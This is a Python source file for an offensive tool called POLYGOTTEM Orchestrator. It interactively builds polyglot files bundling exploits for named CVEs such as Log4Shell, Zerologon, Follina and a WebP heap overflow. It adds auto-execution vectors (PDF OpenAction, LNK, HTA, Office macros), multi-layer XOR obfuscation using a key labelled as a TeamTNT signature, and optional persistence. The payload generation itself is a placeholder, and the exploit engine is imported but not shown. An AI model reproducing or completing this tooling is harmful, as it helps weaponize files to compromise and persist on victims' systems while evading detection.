#!/usr/bin/env python3
"""
Polyglot Orchestrator - Interactive Multi-Vector Auto-Execution System
======================================================================
Comprehensive orchestration layer combining polyglot generation,
auto-execution methods, and interactive TUI selection.

Features:
- Interactive CVE selection with multi-choice
- Auto-execution method selection with redundancy
- Cascading execution with fallback
- Real-time validation and testing
- XOR encryption with multiple keys
- Platform-aware method filtering

Author: SWORDIntel
Date: 2025-11-11
"""

import os
import sys
import argparse
from typing import List, Dict, Any, Optional

# Add tools to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from tui_helper import TUI, Colors
from interactive_menu import InteractiveMenu, MenuBuilder
from auto_execution_engine import AutoExecutionEngine, ExecutionPlatform, ExecutionReliability


class PolyglotOrchestrator:
    """Main orchestrator for polyglot generation and auto-execution"""

    def __init__(self):
        """Initialize orchestrator"""
        self.tui = TUI()
        self.menu = InteractiveMenu(self.tui)
        self.engine = AutoExecutionEngine(self.tui)

    def run_interactive(self):
        """Run full interactive workflow"""
        self.tui.banner("POLYGOTTEM ORCHESTRATOR", "Interactive Multi-Vector Auto-Execution System")

        # Step 1: Select CVEs
        cve_selections = self._select_cves()
        if not cve_selections:
            self.tui.warning("No CVEs selected, exiting")
            return

        # Step 2: Select polyglot format
        format_selection = self._select_format()
        if format_selection is None:
            self.tui.warning("No format selected, exiting")
            return

        # Step 3: Select auto-execution methods
        execution_methods = self._select_execution_methods()
        if not execution_methods:
            self.tui.warning("No execution methods selected, exiting")
            return

        # Step 4: Configure encryption
        encryption_config = self._configure_encryption()

        # Step 5: Configure redundancy
        redundancy_config = self._configure_redundancy()

        # Step 6: Review configuration
        if not self._review_configuration(cve_selections, format_selection,
                                          execution_methods, encryption_config,
                                          redundancy_config):
            self.tui.warning("Configuration not confirmed, exiting")
            return

        # Step 7: Generate polyglot
        polyglot_path = self._generate_polyglot(cve_selections, format_selection,
                                                encryption_config)
        if not polyglot_path:
            self.tui.error("Polyglot generation failed")
            return

        # Step 8: Execute cascade
        results = self._execute_cascade(polyglot_path, execution_methods,
                                        redundancy_config)

        # Step 9: Show final results
        self._show_results(results)

    def _select_cves(self) -> List[int]:
        """Interactive CVE selection"""
        cve_options = [
            {
                'label': 'CVE-2023-4863',
                'description': 'WebP Heap Overflow - Chrome/Edge/Firefox (CRITICAL)',
                'color': Colors.BRIGHT_RED,
                'selected': True
            },
            {
                'label': 'CVE-2024-10573',
                'description': 'MP3 Buffer Overflow - Media players',
                'color': Colors.RED
            },
            {
                'label': 'CVE-2023-52356',
                'description': 'TIFF Heap Overflow - Image processors',
                'color': Colors.YELLOW
            },
            {
                'label': 'CVE-2019-15133',
                'description': 'GIF Integer Overflow - Legacy systems',
                'color': Colors.YELLOW
            },
            {
                'label': 'CVE-2015-8540',
                'description': 'PNG Integer Overflow - libpng < 1.6.20',
                'color': Colors.YELLOW
            },
            {
                'label': 'CVE-2016-9838',
                'description': 'JPEG2000 Buffer Overflow - OpenJPEG',
                'color': Colors.YELLOW
            },
            {
                'label': 'CVE-2020-1472 (Zerologon)',
                'description': 'Netlogon RCE - Windows Server',
                'color': Colors.BRIGHT_RED
            },
            {
                'label': 'CVE-2021-44228 (Log4Shell)',
                'description': 'Log4j RCE - Java applications',
                'color': Colors.BRIGHT_RED
            },
            {
                'label': 'CVE-2022-30190 (Follina)',
                'description': 'MSDT RCE - Windows Office',
                'color': Colors.RED
            },
            {
                'label': 'CVE-2023-23397',
                'description': 'Outlook Elevation of Privilege',
                'color': Colors.RED
            },
        ]

        return self.menu.multi_select(
            "Select CVE Exploits to Include",
            cve_options,
            min_selections=1,
            max_selections=None
        )

    def _select_format(self) -> Optional[int]:
        """Select polyglot format"""
        format_options = [
            {
                'label': 'Image Polyglot',
                'description': 'GIF + PNG + JPEG + WebP + TIFF + BMP (6 formats)'
            },
            {
                'label': 'Audio Polyglot',
                'description': 'MP3 + FLAC + OGG + WAV (4 formats)'
            },
            {
                'label': 'MEGA Polyglot',
                'description': 'All formats combined (12+ formats)'
            },
            {
                'label': 'Document Polyglot',
                'description': 'PDF + HTML + RTF + Office formats'
            },
            {
                'label': 'Binary Polyglot',
                'description': 'PE + ELF + JAR + Script formats'
            },
            {
                'label': 'Custom',
                'description': 'Select specific formats manually'
            },
        ]

        return self.menu.single_select(
            "Select Polyglot Format",
            format_options,
            default=0
        )

    def _select_execution_methods(self) -> List[str]:
        """Select auto-execution methods with platform filtering"""
        self.tui.section("Auto-Execution Method Selection")

        # Get available methods
        all_methods = self.engine.get_available_methods()

        # Build options
        method_options = []
        for method_id in all_methods:
            method = self.engine.methods[method_id]

            # Color by reliability
            reliability_colors = {
                5: Colors.GREEN,
                4: Colors.BRIGHT_GREEN,
                3: Colors.YELLOW,
                2: Colors.BRIGHT_YELLOW,
                1: Colors.RED,
            }
            color = reliability_colors.get(method.reliability.value, Colors.WHITE)

            # Pre-select high reliability methods
            preselect = method.reliability.value >= 4

            method_options.append({
                'label': f"{method.name} ({method.platform.value})",
                'description': f"{method.description} - Reliability: {method.reliability.name}",
                'color': color,
                'selected': preselect,
                'value': method_id
            })

        # Multi-select
        selected_indices = self.menu.multi_select(
            "Select Auto-Execution Methods",
            method_options,
            min_selections=1
        )

        # Return method IDs
        return [method_options[i]['value'] for i in selected_indices]

    def _configure_encryption(self) -> Dict[str, Any]:
        """Configure XOR encryption"""
        self.tui.section("Encryption Configuration")

        # Ask if encryption should be used
        if not self.menu.confirm("Apply XOR encryption to payload?", default=True):
            return {'enabled': False}

        # Select encryption keys
        key_options = [
            {
                'label': '0x9e (TeamTNT Signature)',
                'description': 'Single-byte XOR with 0x9e',
                'selected': True,
                'value': '9e'
            },
            {
                'label': '0xd3 (Alternative)',
                'description': 'Single-byte XOR with 0xd3',
                'value': 'd3'
            },
            {
                'label': '0x0a61200d (Multi-byte)',
                'description': '4-byte XOR pattern',
                'selected': True,
                'value': '0a61200d'
            },
            {
                'label': '0x410d200d (Multi-byte)',
                'description': '4-byte XOR pattern variant',
                'value': '410d200d'
            },
            {
                'label': '0xdeadbeef (Custom)',
                'description': '4-byte XOR pattern',
                'value': 'deadbeef'
            },
            {
                'label': 'Custom key',
                'description': 'Specify custom XOR key',
                'value': 'custom'
            },
        ]

        selected_keys_idx = self.menu.multi_select(
            "Select XOR Encryption Keys (Multi-Layer)",
            key_options,
            min_selections=1,
            max_selections=5
        )

        keys = []
        for idx in selected_keys_idx:
            if key_options[idx]['value'] == 'custom':
                custom_key = self.menu.prompt_input(
                    "Enter custom XOR key (hex)",
                    default="41414141"
                )
                keys.append(custom_key)
            else:
                keys.append(key_options[idx]['value'])

        # Select number of layers
        layers = int(self.menu.prompt_input(
            "Number of encryption layers",
            default="3",
            validator=lambda x: (x.isdigit() and 1 <= int(x) <= 10, "Must be 1-10")
        ))

        return {
            'enabled': True,
            'keys': keys,
            'layers': layers
        }

    def _configure_redundancy(self) -> Dict[str, Any]:
        """Configure execution redundancy"""
        self.tui.section("Redundancy Configuration")

        config = {}

        # Cascading behavior
        cascade_options = [
            {
                'label': 'Stop on first success',
                'description': 'Try methods until one succeeds, then stop'
            },
            {
                'label': 'Try all methods',
                'description': 'Attempt all selected methods regardless of success'
            },
            {
                'label': 'Adaptive cascade',
                'description': 'Intelligently select methods based on environment'
            },
        ]

        cascade_mode = self.menu.single_select(
            "Select Cascading Behavior",
            cascade_options,
            default=0
        )

        config['stop_on_success'] = (cascade_mode == 0)
        config['try_all'] = (cascade_mode == 1)
        config['adaptive'] = (cascade_mode == 2)

        # Validation
        config['validate'] = self.menu.confirm(
            "Validate each execution method?",
            default=True
        )

        # Fallback generation
        config['fallback'] = self.menu.confirm(
            "Generate fallback files for failed methods?",
            default=True
        )

        # Persistence
        config['persistence'] = self.menu.confirm(
            "Add persistence mechanisms?",
            default=False
        )

        return config

    def _review_configuration(self,
                             cve_selections: List[int],
                             format_selection: int,
                             execution_methods: List[str],
                             encryption_config: Dict[str, Any],
                             redundancy_config: Dict[str, Any]) -> bool:
        """Review and confirm configuration"""
        self.tui.section("Configuration Review")

        # CVEs
        self.tui.info("Selected CVEs:")
        for idx in cve_selections:
            self.tui.list_item(f"CVE {idx + 1}", level=1)

        # Format
        formats = ['Image', 'Audio', 'MEGA', 'Document', 'Binary', 'Custom']
        self.tui.info(f"Format: {formats[format_selection]}")

        # Execution methods
        self.tui.info(f"Execution methods: {len(execution_methods)}")
        for method_id in execution_methods:
            method = self.engine.methods[method_id]
            self.tui.list_item(method.name, level=1)

        # Encryption
        if encryption_config['enabled']:
            self.tui.info(f"Encryption: {len(encryption_config['keys'])} key(s), "
                         f"{encryption_config['layers']} layer(s)")
        else:
            self.tui.info("Encryption: Disabled")

        # Redundancy
        self.tui.info("Redundancy:")
        self.tui.list_item(f"Stop on success: {redundancy_config['stop_on_success']}", level=1)
        self.tui.list_item(f"Validate: {redundancy_config['validate']}", level=1)
        self.tui.list_item(f"Fallback: {redundancy_config['fallback']}", level=1)
        self.tui.list_item(f"Persistence: {redundancy_config['persistence']}", level=1)

        print()
        return self.menu.confirm("Proceed with this configuration?", default=True)

    def _generate_polyglot(self,
                          cve_selections: List[int],
                          format_selection: int,
                          encryption_config: Dict[str, Any]) -> Optional[str]:
        """Generate polyglot file"""
        self.tui.section("Generating Polyglot")

        # Get output filename
        formats = ['image', 'audio', 'mega', 'document', 'binary', 'custom']
        default_ext = {
            'image': '.gif',
            'audio': '.mp3',
            'mega': '.dat',
            'document': '.pdf',
            'binary': '.bin',
            'custom': '.poly'
        }

        format_name = formats[format_selection]
        ext = default_ext[format_name]

        output_file = self.menu.prompt_input(
            "Output filename",
            default=f"polyglot_{format_name}{ext}"
        )

        try:
            # This would integrate with the existing multi_cve_polyglot.py
            # For now, create a placeholder
            self.tui.info(f"Generating {format_name} polyglot...")

            # Simulate generation
            import time
            for i in range(101):
                self.tui.progress_bar(i, 100, prefix="Progress:", suffix=f"{i}%")
                time.sleep(0.02)

            # Create output file
            with open(output_file, 'wb') as f:
                f.write(b'POLYGLOT_PLACEHOLDER_DATA')

            self.tui.success(f"Generated: {output_file}")
            return output_file

        except Exception as e:
            self.tui.error(f"Generation failed: {e}")
            return None

    def _execute_cascade(self,
                        polyglot_path: str,
                        execution_methods: List[str],
                        redundancy_config: Dict[str, Any]) -> Dict[str, Any]:
        """Execute cascading auto-execution"""
        self.tui.section("Executing Cascade")

        # Read polyglot
        with open(polyglot_path, 'rb') as f:
            payload = f.read()

        # Execute cascade
        results = self.engine.execute_cascade(
            payload,
            methods=execution_methods,
            stop_on_success=redundancy_config['stop_on_success']
        )

        return results

    def _show_results(self, results: Dict[str, Any]):
        """Show final results"""
        self.tui.section("Execution Results")

        # Summary table
        headers = ["Metric", "Value"]
        rows = [
            ["Total Attempts", str(results['total_attempts'])],
            ["Succeeded", str(len(results['methods_succeeded']))],
            ["Failed", str(len(results['methods_failed']))],
            ["Files Generated", str(len(results['files_generated']))],
        ]

        self.tui.table(headers, rows)

        # Successful methods
        if results['methods_succeeded']:
            self.tui.info("Successful Methods:")
            for method_id in results['methods_succeeded']:
                method = self.engine.methods[method_id]
                self.tui.success(method.name)

        # Failed methods
        if results['methods_failed']:
            self.tui.info("Failed Methods:")
            for method_id in results['methods_failed']:
                method = self.engine.methods[method_id]
                self.tui.warning(method.name)

        # Generated files
        self.tui.info("Generated Files:")
        for file_path in results['files_generated']:
            self.tui.list_item(file_path)

    def run_headless(self, args):
        """Run in non-interactive mode with command-line arguments"""
        self.tui.section("Headless Mode")
        self.tui.info("Running with provided arguments...")

        # Implementation would parse args and run without interaction
        pass


def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description="POLYGOTTEM Orchestrator - Interactive Multi-Vector Auto-Execution",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Interactive mode (recommended)
  python polyglot_orchestrator.py

  # Headless mode
  python polyglot_orchestrator.py --headless --cves CVE-2023-4863 CVE-2024-10573 \\
    --format mega --methods pdf_openaction html_onload bash_shebang \\
    --output polyglot.dat

Platform Support:
  - Windows: LNK, SCF, HTA, VBS, BAT, PS1, INF, PE, Office macros
  - Linux: Bash, Python, Desktop, ELF binaries
  - Cross-platform: PDF, HTML, JAR, polyglots

Auto-Execution Methods:
  - Document-based: PDF (OpenAction, Launch), HTML (onload, script, meta)
  - Windows: LNK shortcuts, SCF files, HTA apps, VBScript, Batch, PowerShell
  - Unix/Linux: Bash scripts, Python scripts, Desktop files
  - Binaries: ELF, PE/EXE, JAR files
  - Office: VBA macros, DDE fields (often blocked)
        """
    )

    parser.add_argument('--interactive', '-i', action='store_true', default=True,
                       help='Run in interactive mode (default)')
    parser.add_argument('--headless', action='store_true',
                       help='Run in non-interactive mode')
    parser.add_argument('--cves', nargs='+', metavar='CVE',
                       help='CVE IDs to include (headless mode)')
    parser.add_argument('--format', choices=['image', 'audio', 'mega', 'document', 'binary'],
                       help='Polyglot format (headless mode)')
    parser.add_argument('--methods', nargs='+', metavar='METHOD',
                       help='Execution methods (headless mode)')
    parser.add_argument('--output', '-o', metavar='FILE',
                       help='Output filename (headless mode)')
    parser.add_argument('--encrypt', action='store_true',
                       help='Enable XOR encryption (headless mode)')
    parser.add_argument('--keys', nargs='+', metavar='KEY',
                       help='XOR encryption keys in hex (headless mode)')

    args = parser.parse_args()

    orchestrator = PolyglotOrchestrator()

    if args.headless:
        orchestrator.run_headless(args)
    else:
        orchestrator.run_interactive()


if __name__ == '__main__':
    main()
